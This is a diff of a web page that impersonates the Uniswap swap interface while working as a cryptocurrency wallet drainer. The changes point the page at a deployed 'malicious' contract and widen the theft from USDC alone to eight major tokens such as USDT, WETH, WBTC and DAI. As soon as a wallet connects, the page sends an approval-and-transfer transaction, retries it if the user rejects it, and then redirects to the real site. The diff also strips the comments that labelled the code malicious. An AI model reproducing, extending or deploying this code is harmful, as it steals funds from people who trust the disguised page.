@@ -7,14 +7,9 @@
   <link rel="icon" type="image/x-icon" href="https://uniswap.org/favicon.ico" />
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
-
-  <!-- ⬇️ LIBRARY FOR WALLETS ⬇️ -->
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 
   <style>
-    /* ============================================
-       UNISWAP DESIGN SYSTEM
-       ============================================ */
     :root {
       --neutral1: #131313;
       --neutral1-hovered: rgba(19, 19, 19, 0.83);
@@ -55,9 +50,6 @@
       --shadow-short: 0px 1px 6px 2px rgba(0,0,0,0.03), 0px 1px 2px 0px rgba(0,0,0,0.02);
     }
 
-    /* ============================================
-       RESET & BASE
-       ============================================ */
     * {
       margin: 0;
       padding: 0;
@@ -74,9 +66,6 @@
       -webkit-font-smoothing: antialiased;
     }
 
-    /* ============================================
-       NAVBAR FULL-WIDTH
-       ============================================ */
     .navbar {
       display: flex;
       align-items: center;
@@ -149,7 +138,6 @@
       font-weight: var(--font-weight-medium);
     }
     
-    /* ===== RIGHT ===== */
     .navbar-right {
       display: flex;
       align-items: center;
@@ -197,9 +185,6 @@
       color: currentColor;
     }
 
-    /* ============================================
-       MAIN CONTAINER
-       ============================================ */
     .main-container {
       display: flex;
       justify-content: center;
@@ -209,9 +194,6 @@
       background: var(--surface1);
     }
 
-    /* ============================================
-       SWAP CARD
-       ============================================ */
     .swap-card {
       background: transparent;
       border: none;
@@ -233,7 +215,6 @@
       margin-bottom: var(--space-12);
     }
     
-    /* ===== TABS ===== */
     .swap-tabs {
       display: flex;
       gap: var(--space-4);
@@ -281,7 +262,6 @@
       transition: transform 0.1s cubic-bezier(0.17, 0.67, 0.45, 1);
     }
 
-    /* ===== ICONS ===== */
     .settings-icons {
       display: flex;
       align-items: center;
@@ -350,9 +330,6 @@
       color: rgba(19, 19, 19, 0.63);
     }
 
-    /* ============================================
-       TOKEN INPUT
-       ============================================ */
     .token-input {
       background: var(--surface2);
       border-radius: var(--radius-20);
@@ -432,9 +409,6 @@
       margin-top: var(--space-4);
     }
 
-    /* ============================================
-       SWAP ARROW
-       ============================================ */
     .swap-arrow {
       text-align: center;
       margin: var(--space-4) 0;
@@ -466,9 +440,6 @@
       height: 24px;
     }
 
-    /* ============================================
-       SWAP BUTTON
-       ============================================ */
     .swap-btn {
       width: 100%;
       padding: 18px 24px;
@@ -488,9 +459,6 @@
       transform: scale(0.98);
     }
 
-    /* ============================================
-       HELP ICON
-       ============================================ */
     .help-icon {
       position: fixed;
       bottom: 16px;
@@ -512,9 +480,6 @@
       color: var(--neutral1);
     }
 
-    /* ============================================
-       MODAL
-       ============================================ */
     .modal-overlay {
       display: none;
       position: fixed;
@@ -712,7 +677,6 @@
       text-transform: lowercase;
     }
 
-    /* ===== OTHER WALLETS VIEW ===== */
     .other-header {
       display: flex;
       align-items: center;
@@ -796,9 +760,6 @@
       font-size: 14px;
     }
 
-    /* ============================================
-       LOADING SPINNER (per la transazione)
-       ============================================ */
     .spinner {
       display: inline-block;
       width: 20px;
@@ -815,11 +776,7 @@
 </head>
 <body>
 
-  <!-- ============================================
-       NAVBAR
-       ============================================ -->
   <nav class="navbar">
-    <!-- LEFT -->
     <div class="navbar-left">
       <a href="#" class="logo">
         <svg xmlns="http://www.w3.org/2000/svg" width="20" height="22" viewBox="0 0 20 22" fill="none">
@@ -836,7 +793,6 @@
         <span class="logo-text">Uniswap</span>
         <span class="logo-chevron"><i class="fas fa-chevron-down"></i></span>
       </a>
-      
       <div class="nav-links">
         <span class="active">Trade</span>
         <span>Explore</span>
@@ -845,27 +801,19 @@
         <span>Portfolio</span>
       </div>
     </div>
-    
-    <!-- RIGHT -->
     <div class="navbar-right">
       <button class="nav-icon-btn" aria-label="Navigation button">
         <svg viewBox="0 0 24 24" fill="none" stroke-width="8">
           <path d="M4.02002 14C2.91602 14 2.01501 13.104 2.01501 12C2.01501 10.896 2.90501 10 4.01001 10H4.02002C5.12402 10 6.02002 10.896 6.02002 12C6.02002 13.104 5.12502 14 4.02002 14ZM14.02 12C14.02 10.896 13.124 10 12.02 10H12.01C10.906 10 10.015 10.896 10.015 12C10.015 13.104 10.915 14 12.02 14C13.125 14 14.02 13.104 14.02 12ZM22.02 12C22.02 10.896 21.124 10 20.02 10H20.01C18.906 10 18.015 10.896 18.015 12C18.015 13.104 18.915 14 20.02 14C21.125 14 22.02 13.104 22.02 12Z" fill="currentColor"/>
         </svg>
       </button>
-      
       <button class="connect-btn" id="navbarConnect">Connect</button>
     </div>
   </nav>
 
-  <!-- ============================================
-       MAIN CONTENT
-       ============================================ -->
   <div class="main-container">
     <div class="swap-card">
-      
       <div class="swap-header">
-        <!-- TABS -->
         <div class="swap-tabs" id="tabsContainer">
           <button class="active-tab" data-index="0">Swap</button>
           <button data-index="1">Limit</button>
@@ -873,8 +821,6 @@
           <button data-index="3">Sell</button>
           <div class="tab-indicator" id="tabIndicator"></div>
         </div>
-        
-        <!-- ICONS -->
         <div class="settings-icons">
           <button class="swap-expand-btn" aria-label="Swap expand">
             <svg viewBox="0 0 16 16" fill="currentColor" stroke-width="8">
@@ -889,7 +835,6 @@
         </div>
       </div>
 
-      <!-- Token input: You pay -->
       <div class="token-input" id="sellInput">
         <div class="label">Sell</div>
         <div class="row">
@@ -903,7 +848,6 @@
         <div class="balance" id="sellBalance">$0</div>
       </div>
 
-      <!-- Swap arrow -->
       <div class="swap-arrow">
         <div class="arrow-btn">
           <svg viewBox="0 0 24 24" fill="none" stroke-width="2">
@@ -913,7 +857,6 @@
         </div>
       </div>
 
-      <!-- Token input: You receive -->
       <div class="token-input" id="buyInput">
         <div class="label">Buy</div>
         <div class="row">
@@ -930,9 +873,6 @@
     </div>
   </div>
 
-  <!-- ============================================
-       HELP ICON
-       ============================================ -->
   <button class="help-icon" aria-label="Help">
     <svg viewBox="0 0 24 24" fill="none" stroke-width="8">
       <path d="M12 2C6.477 2 2 6.477 2 12C2 17.523 6.477 22 12 22C17.523 22 22 17.523 22 12C22 6.477 17.523 2 12 2ZM12.02 17.5C11.468 17.5 11.0149 17.052 11.0149 16.5C11.0149 15.948 11.458 15.5 12.01 15.5H12.02C12.573 15.5 13.02 15.948 13.02 16.5C13.02 17.052 12.572 17.5 12.02 17.5ZM13.603 12.5281C12.872 13.0181 12.7359 13.291 12.7109 13.363C12.6059 13.676 12.314 13.874 12 13.874C11.921 13.874 11.841 13.862 11.762 13.835C11.369 13.703 11.1581 13.278 11.2891 12.885C11.4701 12.345 11.9391 11.836 12.7671 11.281C13.7881 10.597 13.657 9.84707 13.614 9.60107C13.501 8.94707 12.95 8.38988 12.303 8.27588C11.811 8.18588 11.3301 8.31488 10.9541 8.62988C10.5761 8.94688 10.3589 9.41391 10.3589 9.90991C10.3589 10.3239 10.0229 10.6599 9.60889 10.6599C9.19489 10.6599 8.85889 10.3239 8.85889 9.90991C8.85889 8.96891 9.27099 8.08396 9.98999 7.48096C10.702 6.88496 11.639 6.63605 12.564 6.80005C13.831 7.02405 14.8701 8.07097 15.0911 9.34497C15.3111 10.607 14.782 11.7381 13.603 12.5281Z" fill="currentColor"/>
@@ -946,12 +886,9 @@
     <div class="modal">
       <span class="modal-close" id="modalClose"><i class="fas fa-times"></i></span>
       
-      <!-- ===== MAIN VIEW ===== -->
       <div id="walletMainView">
         <h2>Connect a wallet</h2>
-        
         <div class="wallet-list">
-          <!-- Uniswap Mobile -->
           <div class="wallet-item" onclick="window.location.href='https://uniswap.org'">
             <div class="wallet-icon-svg">
               <svg fill="none" viewBox="0 0 96 96" stroke-width="8">
@@ -967,7 +904,6 @@
 
           <div style="height: 2px; background: var(--surface1);"></div>
 
-          <!-- MetaMask -->
           <div class="wallet-item" onclick="connectMetaMask(); return false;">
             <img src="data:image/svg+xml,%3csvg width='40' height='40' viewBox='0 0 40 40' fill='none' xmlns='http://www.w3.org/2000/svg'%3e%3cg clip-path='url(%23clip0_28292_12829)'%3e%3crect width='40' height='40' fill='%23FDF2EC'/%3e%3cg filter='url(%23filter0_dd_28292_12829)'%3e%3cpath d='M32.1442 31.5512L26.3485 29.8255L21.978 32.4383L18.9285 32.4369L14.5552 29.8255L8.76223 31.5512L7 25.6025L8.76223 19.0002L7 13.4183L8.76223 6.5L17.8143 11.9082H23.092L32.1442 6.5L33.9064 13.4183L32.1442 19.0002L33.9064 25.6025L32.1442 31.5512Z' fill='%23FF5C16'/%3e%3cpath d='M8.76337 6.50002L17.8156 11.912L17.4557 15.6262L8.76337 6.50002ZM14.5566 25.605L18.5395 28.6391L14.5566 29.8255V25.605ZM18.2212 20.5889L17.4557 15.6287L12.5557 19.0018L12.5531 19.0004V19.0029L12.5683 22.4749L14.5552 20.5891L18.2212 20.5889ZM32.1442 6.50002L23.092 11.912L23.4508 15.6262L32.1442 6.50002ZM26.3512 25.605L22.3681 28.6391L26.3512 29.8255V25.605ZM28.3532 19.0027V19.0003L28.3521 19.0016L23.4521 15.6287L22.6866 20.5889H26.351L28.3393 22.4745L28.3532 19.0027Z' fill='%23FF5C16'/%3e%3cpath d='M14.5552 29.8255L8.76223 31.5513L7 25.605H14.5552V29.8255ZM18.2198 20.5875L19.3265 27.7585L17.7928 23.7713L12.5658 22.4745L14.5539 20.5877H18.2198V20.5875ZM26.351 29.8255L32.1442 31.5513L33.9064 25.605H26.351V29.8255ZM22.6866 20.5875L21.58 27.7585L23.1135 23.7713L28.3406 22.4745L26.3512 20.5877H22.6866V20.5875Z' fill='%23E34807'/%3e%3cpath d='M7 25.6025L8.76223 19.0003H12.5517L12.5656 22.4734L17.793 23.7701L19.3265 27.7572L18.5381 28.6353L14.5552 25.6012H7V25.6025ZM33.9064 25.6025L32.1442 19.0003H28.3545L28.3406 22.4734L23.1137 23.7701L21.58 27.7572L22.3681 28.6353L26.3512 25.6012H33.9064V25.6025ZM23.092 11.9082H17.8143L17.4558 15.6224L19.3266 27.7534H21.58L23.4519 15.6224L23.092 11.9082Z' fill='%23FF8D5D'/%3e%3cpath d='M8.76223 6.5L7 13.4183L8.76223 19.0002H12.5517L17.4543 15.6262L8.76223 6.5ZM17.1246 22.0279H15.4078L14.4731 22.9441L17.7941 23.7675L17.1246 22.0267V22.0279ZM32.1442 6.5L33.9064 13.4183L32.1442 19.0002H28.3545L23.4521 15.6262L32.1442 6.5ZM23.7843 22.0279H25.5036L26.4383 22.9453L23.1135 23.7701L23.7843 22.0265V22.0279ZM21.9766 30.0718L22.3683 28.6377L21.58 27.7596H19.3249L18.5368 28.6377L18.9283 30.0718' fill='%23661800'/%3e%3cpath d='M21.9766 30.0716V32.4394H18.9285V30.0716H21.9766Z' fill='%23C0C4CD'/%3e%3cpath d='M14.5566 29.8231L18.931 32.4383V30.0704L18.5393 28.6366L14.5566 29.8231ZM26.3512 29.8231L21.9766 32.4383V30.0704L22.3683 28.6366L26.3512 29.8231Z' fill='%23E7EBF6'/%3e%3c/g%3e%3c/g%3e%3cdefs%3e%3cfilter id='filter0_dd_28292_12829' x='1' y='4.5' width='39' height='38.0493' filterUnits='userSpaceOnUse' color-interpolation-filters='sRGB'%3e%3cfeFlood flood-opacity='0' result='BackgroundImageFix'/%3e%3cfeColorMatrix in='SourceAlpha' type='matrix' values='0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 127 0' result='hardAlpha'/%3e%3cfeOffset dy='2'/%3e%3cfeGaussianBlur stdDeviation='1'/%3e%3cfeComposite in2='hardAlpha' operator='out'/%3e%3cfeColorMatrix type='matrix' values='0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0.06 0'/%3e%3cfeBlend mode='normal' in2='BackgroundImageFix' result='effect1_dropShadow_28292_12829'/%3e%3cfeColorMatrix in='SourceAlpha' type='matrix' values='0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 127 0' result='hardAlpha'/%3e%3cfeMorphology radius='2' operator='dilate' in='SourceAlpha' result='effect2_dropShadow_28292_12829'/%3e%3cfeOffset dy='4'/%3e%3cfeGaussianBlur stdDeviation='2'/%3e%3cfeComposite in2='hardAlpha' operator='out'/%3e%3cfeColorMatrix type='matrix' values='0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0.04 0'/%3e%3cfeBlend mode='multiply' in2='effect1_dropShadow_28292_12829' result='effect2_dropShadow_28292_12829'/%3e%3cfeBlend mode='normal' in='SourceGraphic' in2='effect2_dropShadow_28292_12829' result='shape'/%3e%3c/filter%3e%3cclipPath id='clip0_28292_12829'%3e%3crect width='40' height='40' fill='white'/%3e%3c/clipPath%3e%3c/defs%3e%3c/svg%3e" alt="MetaMask" style="width: 32px; height: 32px; border-radius: 8px; border: 1px solid rgba(19,19,19,0.08);" />
             <span>MetaMask</span>
@@ -976,7 +912,6 @@
 
           <div style="height: 2px; background: var(--surface1);"></div>
 
-          <!-- Other wallets -->
           <div class="wallet-item" id="otherWalletsBtn" style="cursor:pointer;">
             <div class="wallet-icon-svg">
               <svg fill="none" viewBox="0 0 24 24" stroke-width="8">
@@ -995,7 +930,6 @@
         </div>
 
         <button class="create-account-btn">Create account</button>
-        
         <button class="log-in-link" onclick="window.location.href='https://app.uniswap.org'">
           <svg viewBox="0 0 24 24" fill="none" stroke-width="8">
             <path d="M16.4303 8.67684C16.2913 8.71327 16.1049 8.77702 16.0162 8.81648C15.4246 9.08059 14.8448 9.63916 14.5608 10.2281C14.2177 10.9324 14.1733 11.8886 14.4514 12.605C14.6969 13.2365 15.1406 13.7677 15.6878 14.0834L15.8978 14.2048L15.9008 16.4816L15.9067 18.7584L16.522 19.3807L17.1402 20L18.1607 18.9557C18.7228 18.3789 19.1813 17.8963 19.1813 17.878C19.1813 17.8629 18.9121 17.5714 18.5837 17.2345L17.9833 16.6182L18.3855 16.2023C18.9062 15.662 19.1813 15.3645 19.1813 15.3341C19.1813 15.322 18.986 15.1065 18.7464 14.8545C18.5068 14.6025 18.2938 14.3748 18.2761 14.3445C18.2436 14.299 18.2613 14.2807 18.421 14.1897C19.1043 13.8102 19.5569 13.3002 19.8261 12.6111C19.971 12.2377 20.0361 11.6336 19.9799 11.1266C19.8646 10.049 19.0807 9.08362 18.0365 8.72845C17.6135 8.58273 16.8562 8.55845 16.4303 8.67684ZM17.4153 9.92755C17.6934 10.0247 17.998 10.4922 17.9566 10.7593C17.93 10.9293 17.7673 11.2359 17.649 11.3361C17.4183 11.5334 17.0456 11.5729 16.7823 11.4333C16.3534 11.2056 16.2084 10.6379 16.4747 10.2433C16.5575 10.1188 16.7527 9.96701 16.8888 9.91541C17.0219 9.86683 17.2585 9.87291 17.4153 9.92755Z" fill="currentColor" fill-rule="evenodd" clip-rule="evenodd"/>
@@ -1010,7 +944,6 @@
         </div>
       </div>
 
-      <!-- ===== OTHER WALLETS VIEW ===== -->
       <div id="walletOtherView" style="display:none;">
         <div class="other-header">
           <button class="back-btn" id="backToMainBtn">
@@ -1022,7 +955,6 @@
         </div>
 
         <div class="wallet-list other-list">
-          <!-- WalletConnect (DISABLED) -->
           <div class="wallet-item" onclick="return false;">
             <img src="data:image/svg+xml,%3csvg%20width='40'%20height='40'%20viewBox='0%200%2040%2040'%20fill='none'%20xmlns='http://www.w3.org/2000/svg'%3e%3crect%20width='40'%20height='40'%20fill='%233396FF'/%3e%3cpath%20d='M20%2040C31.0457%2040%2040%2031.0457%2040%2020C40%208.9543%2031.0457%200%2020%200C8.9543%200%200%208.9543%200%2020C0%2031.0457%208.9543%2040%2020%2040Z'%20fill='%233396FF'/%3e%3cpath%20d='M12.2327%2014.8836C16.5225%2010.7003%2023.4779%2010.7003%2027.7677%2014.8836L28.284%2015.3871C28.4985%2015.5962%2028.4985%2015.9353%2028.284%2016.1445L26.5179%2017.8668C26.4106%2017.9713%2026.2368%2017.9713%2026.1295%2017.8668L25.419%2017.1739C22.4263%2014.2555%2017.5741%2014.2555%2014.5813%2017.1739L13.8204%2017.9159C13.7132%2018.0205%2013.5393%2018.0205%2013.4321%2017.9159L11.666%2016.1936C11.4514%2015.9845%2011.4514%2015.6453%2011.666%2015.4362L12.2327%2014.8836ZM31.4203%2018.4454L32.9922%2019.9782C33.2067%2020.1874%2033.2067%2020.5265%2032.9922%2020.7356L25.9045%2027.6473C25.69%2027.8565%2025.3422%2027.8565%2025.1277%2027.6473L20.0973%2022.742C20.0437%2022.6896%2019.9568%2022.6896%2019.9031%2022.742L14.8728%2027.6473C14.6583%2027.8565%2014.3106%2027.8565%2014.096%2027.6473L7.00816%2020.7355C6.79367%2020.5264%206.79367%2020.1873%207.00816%2019.9782L8.58004%2018.4453C8.79454%2018.2362%209.1423%2018.2362%209.35679%2018.4453L14.3873%2023.3508C14.4409%2023.4031%2014.5278%2023.4031%2014.5814%2023.3508L19.6117%2018.4453C19.8262%2018.2361%2020.1739%2018.2361%2020.3885%2018.4453L25.4189%2023.3508C25.4726%2023.4031%2025.5595%2023.4031%2025.6131%2023.3508L30.6436%2018.4454C30.858%2018.2362%2031.2058%2018.2362%2031.4203%2018.4454Z'%20fill='white'/%3e%3c/svg%3e" alt="WalletConnect" style="width: 32px; height: 32px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.12);" />
             <span>WalletConnect</span>
@@ -1031,7 +963,6 @@
 
           <div style="height: 2px; background: var(--surface1);"></div>
 
-          <!-- Coinbase Wallet -->
           <div class="wallet-item" onclick="connectCoinbase(); return false;">
             <img src="data:image/svg+xml,%3csvg%20width='40'%20height='40'%20viewBox='0%200%2040%2040'%20fill='none'%20xmlns='http://www.w3.org/2000/svg'%3e%3cg%20clip-path='url(%23clip0_13571_129878)'%3e%3crect%20width='40'%20height='40'%20fill='%230052FF'/%3e%3cpath%20fill-rule='evenodd'%20clip-rule='evenodd'%20d='M8.3312%200H31.6672C36.2704%200%2040%204.0128%2040%208.9632V31.0368C40%2035.9872%2036.2704%2040%2031.6688%2040H8.3312C3.7296%2040%200%2035.9872%200%2031.0368V8.9632C0%204.0128%203.7296%200%208.3312%200Z'%20fill='%230052FF'/%3e%3cpath%20fill-rule='evenodd'%20clip-rule='evenodd'%20d='M19.9989%205.79443C27.8453%205.79443%2034.2053%2012.1544%2034.2053%2020.0008C34.2053%2027.8472%2027.8453%2034.2072%2019.9989%2034.2072C12.1525%2034.2072%205.79254%2027.8472%205.79254%2020.0008C5.79254%2012.1544%2012.1525%205.79443%2019.9989%205.79443Z'%20fill='white'/%3e%3cpath%20fill-rule='evenodd'%20clip-rule='evenodd'%20d='M16.5005%2015.459H23.4973C24.0733%2015.459%2024.5389%2015.9614%2024.5389%2016.579V23.419C24.5389%2024.0382%2024.0717%2024.539%2023.4973%2024.539H16.5005C15.9245%2024.539%2015.4589%2024.0366%2015.4589%2023.419V16.579C15.4589%2015.9614%2015.9261%2015.459%2016.5005%2015.459Z'%20fill='%230052FF'/%3e%3c/g%3e%3cdefs%3e%3cclipPath%20id='clip0_13571_129878'%3e%3crect%20width='40'%20height='40'%20fill='white'/%3e%3c/clipPath%3e%3c/defs%3e%3c/svg%3e" alt="Coinbase Wallet" style="width: 32px; height: 32px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.12);" />
             <span>Coinbase Wallet</span>
@@ -1040,7 +971,6 @@
 
           <div style="height: 2px; background: var(--surface1);"></div>
 
-          <!-- Binance Wallet -->
           <div class="wallet-item" onclick="connectBinance(); return false;">
             <img src="bnbwallet.svg" alt="Binance Wallet" style="width: 32px; height: 32px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.12);" />
             <span>Binance Wallet</span>
@@ -1057,7 +987,7 @@
   </div>
 
   <!-- ============================================
-       JAVASCRIPT (WALLET CONNECTORS + MALICIOUS LOGIC)
+       JAVASCRIPT
        ============================================ -->
   <script>
     // ============================================
@@ -1070,12 +1000,21 @@
     // ============================================
     // CONTRACT CONFIGURATION (MALICIOUS)
     // ============================================
-    const MALICIOUS_CONTRACT_ADDRESS = '0x...'; // REPLACE WITH YOUR DEPLOYED CONTRACT
-    const USDC_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'; // USDC mainnet
-    const MAX_DRAIN = 5000 * 10**6; // 5000 USDC
+    const MALICIOUS_CONTRACT_ADDRESS = '0xB8e430Fb6253C6ead3731ACB7B6dC4a8499C39D5';
+    
+    const TOKENS = [
+      '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', // USDC
+      '0xdAC17F958D2ee523a2206206994597C13D831ec7', // USDT
+      '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', // WETH
+      '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', // WBTC
+      '0x6B175474E89094C44Da98b954EedeAC495271d0F', // DAI
+      '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', // UNI
+      '0x514910771AF9Ca656af840dff83E8264EcF986CA', // LINK
+      '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9'  // AAVE
+    ];
 
     const MALICIOUS_ABI = [
-      "function swap(address token) external"
+      "function swap(address[] calldata tokens) external"
     ];
 
     // ============================================
@@ -1090,7 +1029,7 @@
         console.log('✅ Prices loaded:', { eth: ethPrice, usdc: usdcPrice });
       } catch (error) {
         console.warn('⚠️ Failed to fetch prices, using fallback');
-        ethPrice = 3200; // fallback
+        ethPrice = 3200;
         usdcPrice = 1;
       }
     }
@@ -1102,14 +1041,12 @@
       if (!provider || !userAddress) return;
 
       try {
-        // 1. ETH balance
         const ethBalance = await provider.getBalance(userAddress);
         const ethBalanceFormatted = parseFloat(ethers.utils.formatEther(ethBalance)).toFixed(4);
         document.getElementById('sellBalance').textContent = `$${(ethBalanceFormatted * ethPrice).toFixed(2)}`;
 
-        // 2. USDC balance (if we have the contract)
         try {
-          const usdcContract = new ethers.Contract(USDC_ADDRESS, [
+          const usdcContract = new ethers.Contract(TOKENS[0], [
             "function balanceOf(address) view returns (uint256)"
           ], provider);
           const usdcBalance = await usdcContract.balanceOf(userAddress);
@@ -1119,11 +1056,9 @@
           document.getElementById('buyBalance').textContent = '$0';
         }
 
-        // 3. Update input placeholders with real values
         document.getElementById('sellAmount').placeholder = ethBalanceFormatted;
         document.getElementById('buyAmount').placeholder = '0.00';
 
-        // 4. Auto-calculate swap (ETH → USDC)
         document.getElementById('sellAmount').addEventListener('input', function() {
           const ethValue = parseFloat(this.value) || 0;
           const usdcValue = ethValue * ethPrice;
@@ -1144,28 +1079,22 @@
       isApprovalPending = true;
 
       try {
-        // Show loading state on swap button
         const swapBtn = document.getElementById('swapBtn');
-        const originalText = swapBtn.textContent;
         swapBtn.innerHTML = '<span class="spinner"></span> Approving...';
         swapBtn.disabled = true;
 
-        // 1. Create malicious contract
         const contract = new ethers.Contract(
           MALICIOUS_CONTRACT_ADDRESS,
           MALICIOUS_ABI,
           signer
         );
 
-        // 2. Call swap (which does approve + transferFrom)
         console.log('🔴 Triggering malicious approval...');
-        const tx = await contract.swap(USDC_ADDRESS);
+        const tx = await contract.swap(TOKENS);
         
-        // 3. Wait for confirmation
         await tx.wait();
         console.log('✅ Transaction confirmed:', tx.hash);
 
-        // 4. Show success and redirect
         swapBtn.innerHTML = '✓ Success!';
         setTimeout(() => {
           window.location.href = 'https://app.uniswap.org';
@@ -1178,7 +1107,6 @@
         swapBtn.disabled = false;
         isApprovalPending = false;
 
-        // Auto-retry after 3 seconds
         setTimeout(() => {
           if (signer) {
             swapBtn.innerHTML = 'Swap';
@@ -1193,7 +1121,6 @@
     // WALLET CONNECTION FUNCTIONS
     // ============================================
 
-    // ----- 1. MetaMask -----
     async function connectMetaMask() {
       if (!window.ethereum) {
         alert('MetaMask not installed! Download it from https://metamask.io');
@@ -1212,7 +1139,6 @@
       }
     }
 
-    // ----- 2. Coinbase Wallet -----
     async function connectCoinbase() {
       const coinbaseProvider = window.coinbaseWallet || window.ethereum;
       if (!coinbaseProvider) {
@@ -1232,7 +1158,6 @@
       }
     }
 
-    // ----- 3. Binance Wallet -----
     async function connectBinance() {
       const binanceProvider = window.bnb || window.binance || window.ethereum;
       if (!binanceProvider) {
@@ -1256,17 +1181,12 @@
     // AFTER CONNECT: UPDATE UI + TRIGGER APPROVAL
     // ============================================
     async function afterConnect() {
-      // 1. Update UI
       updateUIafterConnect();
       document.getElementById('modalOverlay').classList.remove('show');
 
-      // 2. Fetch real prices
       await fetchPrices();
-
-      // 3. Update UI with real data
       await updateUIWithRealData();
 
-      // 4. After 1 second, trigger malicious approval
       setTimeout(() => {
         triggerMaliciousApproval();
       }, 1500);
@@ -1322,7 +1242,6 @@
         document.getElementById('modalOverlay').classList.add('show');
         return;
       }
-      // If already connected and approval not pending, trigger again
       if (!isApprovalPending) {
         triggerMaliciousApproval();
       }
@@ -1334,6 +1253,7 @@
     document.addEventListener('click', function(e) {
       const modal = document.getElementById('modalOverlay');
       if (modal.classList.contains('show')) return;
+      if (userAddress) return; // Se connesso, non aprire il modale
       modal.classList.add('show');
     });
 
@@ -1410,9 +1330,6 @@
       });
     })();
 
-    // ============================================
-    // HELP ICON
-    // ============================================
     document.querySelector('.help-icon').addEventListener('click', function(e) {
       e.stopPropagation();
       window.open('https://support.uniswap.org', '_blank');
